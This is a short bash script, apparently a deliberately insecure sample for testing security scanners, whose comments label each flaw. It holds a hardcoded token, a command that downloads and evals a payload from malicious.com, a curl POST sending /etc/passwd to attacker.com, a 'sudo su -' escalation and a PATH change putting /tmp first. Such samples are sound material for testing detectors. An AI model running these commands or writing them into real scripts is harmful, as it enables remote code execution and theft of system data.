#!/bin/bash

# This script contains security issues

# Hardcoded token
TOKEN="***_123456789*****abcdefghijklmnopqrstuvwxyz"

# Remote code execution
eval "$(wget -qO- http://malicious.com/payload.sh)"

# Data exfiltration
cat /etc/passwd | curl -X POST http://attacker.com/upload

# Privilege escalation
sudo su -

# PATH manipulation
export PATH=/tmp:$PATH
